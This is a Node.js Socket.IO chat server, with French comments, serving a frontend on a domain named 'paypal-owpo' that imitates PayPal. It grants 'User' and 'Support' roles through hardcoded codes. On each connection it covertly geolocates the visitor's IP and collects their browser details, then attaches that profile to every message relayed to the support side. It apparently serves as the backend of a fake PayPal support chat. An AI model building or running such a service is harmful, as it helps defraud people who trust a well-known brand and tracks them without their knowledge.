// --- Modules ---
const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

// --- Initialisation du serveur ---
const app = express();
const server = http.createServer(app);

// --- Configuration CORS ---
const frontendURL = "https://paypal-owpo.onrender.com"; // Assurez-vous que c'est la bonne URL de votre frontend
app.use(cors({ origin: frontendURL }));

// --- Initialisation de Socket.IO ---
const io = new Server(server, {
  cors: {
    origin: frontendURL,
    methods: ["GET", "POST"]
  },
  maxHttpBufferSize: 1e6 // Limite de 1Mo pour les données (fichiers)
});

app.use(express.json());

// --- Identifiants ---
const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
const CORRECT_DATE_USER = "18/09/2025";
const CORRECT_CODE_SERVICE = "gg";
const CORRECT_DATE_SERVICE = "123";

// --- Route API de vérification ---
app.post('/verify', (req, res) => {
  const { code, date } = req.body;
  if (code === CORRECT_CODE_USER && date === CORRECT_DATE_USER) {
    res.status(200).json({ success: true, userType: 'User' });
  } else if (code === CORRECT_CODE_SERVICE && date === CORRECT_DATE_SERVICE) {
    res.status(200).json({ success: true, userType: 'Support' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid code or date' });
  }
});

// --- Gestion des connexions Socket.IO ---
io.on('connection', async (socket) => { // La fonction est asynchrone pour permettre la géolocalisation
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };

  try {
      // On interroge un service de géolocalisation gratuit
      const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
      const geoData = await geoResponse.json();
      if (geoData.status === 'success') {
        geoInfo = {
          city: geoData.city,
          country: geoData.country,
          isp: geoData.isp,
        };
      }
  } catch (error) {
    console.error("Erreur de géolocalisation:", error);
  }

  // On assemble toutes les informations dans un seul objet
  const clientInfo = {
    ip: clientIp,
    userAgent: socket.handshake.headers['user-agent'] || 'N/A',
    language: socket.handshake.headers['accept-language'] || 'N/A',
    connectedAt: new Date().toISOString(),
    ...geoInfo
  };
  
  console.log(`Un utilisateur s'est connecté : `, clientInfo);

  socket.broadcast.emit('user activity', { text: 'A user has connected.' });

  socket.on('chat message', (msg) => {
    io.emit('chat message', { ...msg, clientInfo });
  });

  socket.on('file message', (fileData) => {
    io.emit('file message', { ...fileData, clientInfo });
  });

  socket.on('clear chat', () => { io.emit('chat cleared'); });
  socket.on('disconnect', () => { io.emit('user activity', { text: 'A user has disconnected.' }); });
});


// --- Démarrage du serveur ---
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Le serveur est démarré et écoute sur le port ${PORT}`);
});

